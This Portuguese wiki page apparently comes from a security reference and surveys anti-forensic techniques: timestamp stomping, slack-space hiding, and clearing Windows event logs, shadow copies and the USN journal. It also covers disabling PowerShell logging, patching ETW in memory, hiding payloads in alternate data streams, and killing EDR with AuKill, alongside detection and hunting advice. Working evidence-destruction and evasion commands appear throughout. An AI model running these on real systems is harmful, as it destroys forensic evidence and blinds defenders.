# Técnicas Anti-Forense

{{#include ../../banners/hacktricks-training.md}}

## Carimbos de Data/Hora

Um atacante pode estar interessado em **alterar os carimbos de data/hora dos arquivos** para evitar ser detectado.\
É possível encontrar os carimbos de data/hora dentro do MFT nos atributos `$STANDARD_INFORMATION` \_\_ e \_\_ `$FILE_NAME`.

Ambos os atributos têm 4 carimbos de data/hora: **Modificação**, **acesso**, **criação** e **modificação do registro MFT** (MACE ou MACB).

**O explorador do Windows** e outras ferramentas mostram as informações de **`$STANDARD_INFORMATION`**.

### TimeStomp - Ferramenta Anti-forense

Esta ferramenta **modifica** as informações de carimbo de data/hora dentro de **`$STANDARD_INFORMATION`** **mas** **não** as informações dentro de **`$FILE_NAME`**. Portanto, é possível **identificar** **atividade** **suspeita**.

### Usnjrnl

O **USN Journal** (Journal de Número de Sequência de Atualização) é um recurso do NTFS (sistema de arquivos Windows NT) que rastreia mudanças no volume. A ferramenta [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) permite a análise dessas mudanças.

![](<../../images/image (801).png>)

A imagem anterior é a **saída** mostrada pela **ferramenta**, onde pode-se observar que algumas **mudanças foram realizadas** no arquivo.

### $LogFile

**Todas as mudanças de metadados em um sistema de arquivos são registradas** em um processo conhecido como [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Os metadados registrados são mantidos em um arquivo chamado `**$LogFile**`, localizado no diretório raiz de um sistema de arquivos NTFS. Ferramentas como [LogFileParser](https://github.com/jschicht/LogFileParser) podem ser usadas para analisar este arquivo e identificar mudanças.

![](<../../images/image (137).png>)

Novamente, na saída da ferramenta é possível ver que **algumas mudanças foram realizadas**.

Usando a mesma ferramenta, é possível identificar **a que hora os carimbos de data/hora foram modificados**:

![](<../../images/image (1089).png>)

- CTIME: Hora de criação do arquivo
- ATIME: Hora de modificação do arquivo
- MTIME: Modificação do registro MFT do arquivo
- RTIME: Hora de acesso do arquivo

### Comparação entre `$STANDARD_INFORMATION` e `$FILE_NAME`

Outra maneira de identificar arquivos modificados suspeitos seria comparar o tempo em ambos os atributos em busca de **incompatibilidades**.

### Nanosegundos

Os carimbos de data/hora do **NTFS** têm uma **precisão** de **100 nanosegundos**. Portanto, encontrar arquivos com carimbos de data/hora como 2010-10-10 10:10:**00.000:0000 é muito suspeito**.

### SetMace - Ferramenta Anti-forense

Esta ferramenta pode modificar ambos os atributos `$STARNDAR_INFORMATION` e `$FILE_NAME`. No entanto, a partir do Windows Vista, é necessário que um sistema operacional ativo modifique essas informações.

## Ocultação de Dados

O NFTS usa um cluster e o tamanho mínimo de informação. Isso significa que se um arquivo ocupa um e meio cluster, a **metade restante nunca será utilizada** até que o arquivo seja excluído. Portanto, é possível **ocultar dados neste espaço não utilizado**.

Existem ferramentas como slacker que permitem ocultar dados neste espaço "oculto". No entanto, uma análise do `$logfile` e `$usnjrnl` pode mostrar que alguns dados foram adicionados:

![](<../../images/image (1060).png>)

Então, é possível recuperar o espaço não utilizado usando ferramentas como FTK Imager. Note que esse tipo de ferramenta pode salvar o conteúdo ofuscado ou até mesmo criptografado.

## UsbKill

Esta é uma ferramenta que **desliga o computador se qualquer mudança nas portas USB** for detectada.\
Uma maneira de descobrir isso seria inspecionar os processos em execução e **revisar cada script python em execução**.

## Distribuições Live Linux

Essas distros são **executadas dentro da memória RAM**. A única maneira de detectá-las é **caso o sistema de arquivos NTFS esteja montado com permissões de gravação**. Se estiver montado apenas com permissões de leitura, não será possível detectar a intrusão.

## Exclusão Segura

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Configuração do Windows

É possível desativar vários métodos de registro do Windows para dificultar muito a investigação forense.

### Desativar Carimbos de Data/Hora - UserAssist

Esta é uma chave de registro que mantém datas e horas quando cada executável foi executado pelo usuário.

Desativar o UserAssist requer duas etapas:

1. Defina duas chaves de registro, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` e `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, ambas para zero, a fim de sinalizar que queremos o UserAssist desativado.
2. Limpe suas subárvores de registro que se parecem com `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Desativar Carimbos de Data/Hora - Prefetch

Isso salvará informações sobre os aplicativos executados com o objetivo de melhorar o desempenho do sistema Windows. No entanto, isso também pode ser útil para práticas forenses.

- Execute `regedit`
- Selecione o caminho do arquivo `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Clique com o botão direito em `EnablePrefetcher` e `EnableSuperfetch`
- Selecione Modificar em cada um deles para alterar o valor de 1 (ou 3) para 0
- Reinicie

### Desativar Carimbos de Data/Hora - Último Tempo de Acesso

Sempre que uma pasta é aberta a partir de um volume NTFS em um servidor Windows NT, o sistema leva o tempo para **atualizar um campo de carimbo de data/hora em cada pasta listada**, chamado de último tempo de acesso. Em um volume NTFS muito utilizado, isso pode afetar o desempenho.

1. Abra o Editor do Registro (Regedit.exe).
2. Navegue até `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Procure por `NtfsDisableLastAccessUpdate`. Se não existir, adicione este DWORD e defina seu valor como 1, o que desativará o processo.
4. Feche o Editor do Registro e reinicie o servidor.

### Excluir Histórico USB

Todas as **Entradas de Dispositivos USB** são armazenadas no Registro do Windows sob a chave de registro **USBSTOR**, que contém subchaves que são criadas sempre que você conecta um dispositivo USB ao seu PC ou Laptop. Você pode encontrar esta chave aqui `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Excluir isso** você excluirá o histórico USB.\
Você também pode usar a ferramenta [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) para ter certeza de que as excluiu (e para excluí-las).

Outro arquivo que salva informações sobre os USBs é o arquivo `setupapi.dev.log` dentro de `C:\Windows\INF`. Este também deve ser excluído.

### Desativar Cópias de Sombra

**Liste** as cópias de sombra com `vssadmin list shadowstorage`\
**Exclua** executando `vssadmin delete shadow`

Você também pode excluí-las via GUI seguindo os passos propostos em [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Para desativar cópias de sombra [passos daqui](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Abra o programa Serviços digitando "serviços" na caixa de pesquisa de texto após clicar no botão iniciar do Windows.
2. Na lista, encontre "Volume Shadow Copy", selecione-o e acesse Propriedades clicando com o botão direito.
3. Escolha Desativado no menu suspenso "Tipo de Inicialização" e confirme a alteração clicando em Aplicar e OK.

Também é possível modificar a configuração de quais arquivos serão copiados na cópia de sombra no registro `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Sobrescrever arquivos excluídos

- Você pode usar uma **ferramenta do Windows**: `cipher /w:C` Isso indicará ao cipher para remover qualquer dado do espaço de disco não utilizado disponível dentro da unidade C.
- Você também pode usar ferramentas como [**Eraser**](https://eraser.heidi.ie)

### Excluir logs de eventos do Windows

- Windows + R --> eventvwr.msc --> Expanda "Logs do Windows" --> Clique com o botão direito em cada categoria e selecione "Limpar Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Desativar logs de eventos do Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Dentro da seção de serviços, desative o serviço "Windows Event Log"
- `WEvtUtil.exec clear-log` ou `WEvtUtil.exe cl`

### Desativar $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Registro Avançado & Manipulação de Rastreio (2023-2025)

### Registro de ScriptBlock/Module do PowerShell

Versões recentes do Windows 10/11 e Windows Server mantêm **artefatos forenses ricos do PowerShell** sob
`Microsoft-Windows-PowerShell/Operational` (eventos 4104/4105/4106).
Os atacantes podem desativá-los ou apagá-los em tempo real:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Os defensores devem monitorar alterações nessas chaves de registro e a remoção em grande volume de eventos do PowerShell.

### Patch ETW (Event Tracing for Windows)

Os produtos de segurança de endpoint dependem fortemente do ETW. Um método de evasão popular de 2024 é
patchar `ntdll!EtwEventWrite`/`EtwEventWriteFull` na memória para que cada chamada ETW retorne `STATUS_SUCCESS`
sem emitir o evento:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (e.g. `EtwTiSwallow`) implement the same primitive in PowerShell ou C++.
Como o patch é **local ao processo**, EDRs executando dentro de outros processos podem não detectá-lo.
Detecção: compare `ntdll` na memória vs. no disco, ou faça hook antes do modo usuário.

### Revitalização de Fluxos de Dados Alternativos (ADS)

Campanhas de malware em 2023 (e.g. **FIN12** loaders) foram vistas preparando binários de segunda fase
dentro de ADS para se manter fora da vista de scanners tradicionais:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumere fluxos com `dir /R`, `Get-Item -Stream *`, ou Sysinternals `streams64.exe`. Copiar o arquivo host para FAT/exFAT ou via SMB removerá o fluxo oculto e pode ser usado por investigadores para recuperar a carga útil.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver agora é rotineiramente usado para **anti-forensics** em intrusões de ransomware. A ferramenta de código aberto **AuKill** carrega um driver assinado, mas vulnerável (`procexp152.sys`), para suspender ou encerrar sensores EDR e forenses **antes da criptografia e destruição de logs**:
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
O driver é removido posteriormente, deixando artefatos mínimos.  
Mitigações: habilitar a lista de bloqueio de drivers vulneráveis da Microsoft (HVCI/SAC) e alertar sobre a criação de serviços do kernel a partir de caminhos graváveis pelo usuário.

---

## Linux Anti-Forensics: Auto-correção e Cloud C2 (2023–2025)

### Auto-correção de serviços comprometidos para reduzir a detecção (Linux)  
Os adversários cada vez mais “auto-corrigem” um serviço logo após explorá-lo para evitar re-exploração e suprimir detecções baseadas em vulnerabilidades. A ideia é substituir componentes vulneráveis pelos últimos binários/JARs legítimos upstream, de modo que os scanners relatem o host como corrigido enquanto a persistência e o C2 permanecem.

Exemplo: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
- Após a exploração, os atacantes buscaram JARs legítimos do Maven Central (repo1.maven.org), deletaram JARs vulneráveis na instalação do ActiveMQ e reiniciaram o broker.  
- Isso fechou a RCE inicial enquanto mantinha outros pontos de apoio (cron, alterações na configuração do SSH, implantes C2 separados).

Exemplo operacional (ilustrativo)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forense/dicas de caça
- Revise diretórios de serviços em busca de substituições de binários/JAR não programadas:
- Debian/Ubuntu: `dpkg -V activemq` e compare hashes/caminhos de arquivos com espelhos de repositórios.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Procure por versões de JAR presentes no disco que não são de propriedade do gerenciador de pacotes, ou links simbólicos atualizados fora de banda.
- Linha do tempo: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` para correlacionar ctime/mtime com a janela de comprometimento.
- Histórico de shell/telemetria de processos: evidências de `curl`/`wget` para `repo1.maven.org` ou outros CDNs de artefatos imediatamente após a exploração inicial.
- Gestão de mudanças: valide quem aplicou o “patch” e por quê, não apenas que uma versão corrigida está presente.

### C2 de serviço em nuvem com tokens de portador e stagers anti-análise
O comércio observado combinou múltiplos caminhos C2 de longo prazo e empacotamento anti-análise:
- Carregadores ELF PyInstaller protegidos por senha para dificultar a análise em sandbox e análise estática (por exemplo, PYZ criptografado, extração temporária sob `/_MEI*`).
- Indicadores: hits de `strings` como `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Artefatos em tempo de execução: extração para `/tmp/_MEI*` ou caminhos personalizados `--runtime-tmpdir`.
- C2 suportado por Dropbox usando tokens de portador OAuth codificados
- Marcadores de rede: `api.dropboxapi.com` / `content.dropboxapi.com` com `Authorization: Bearer <token>`.
- Caçar em proxy/NetFlow/Zeek/Suricata por HTTPS de saída para domínios do Dropbox a partir de cargas de trabalho de servidor que normalmente não sincronizam arquivos.
- C2 paralelo/backup via tunelamento (por exemplo, Cloudflare Tunnel `cloudflared`), mantendo controle se um canal for bloqueado.
- IOCs de host: processos/unidades `cloudflared`, configuração em `~/.cloudflared/*.json`, saída 443 para bordas do Cloudflare.

### Persistência e “rollback de hardening” para manter acesso (exemplos de Linux)
Os atacantes frequentemente combinam auto-correção com caminhos de acesso duráveis:
- Cron/Anacron: edições no stub `0anacron` em cada diretório `/etc/cron.*/` para execução periódica.
- Caçar:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- Rollback de hardening de configuração SSH: habilitando logins de root e alterando shells padrão para contas de baixo privilégio.
- Caçar habilitação de login root:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# valores de flag como "yes" ou configurações excessivamente permissivas
```
- Caçar por shells interativos suspeitos em contas do sistema (por exemplo, `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Artefatos de beacon com nomes curtos e aleatórios (8 caracteres alfabéticos) gravados no disco que também contatam C2 em nuvem:
- Caçar:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Os defensores devem correlacionar esses artefatos com exposição externa e eventos de patching de serviços para descobrir auto-remediação anti-forense usada para ocultar a exploração inicial.

## Referências

- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (Março 2023)
https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (Junho 2024)
https://redcanary.com/blog/etw-patching-detection

- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
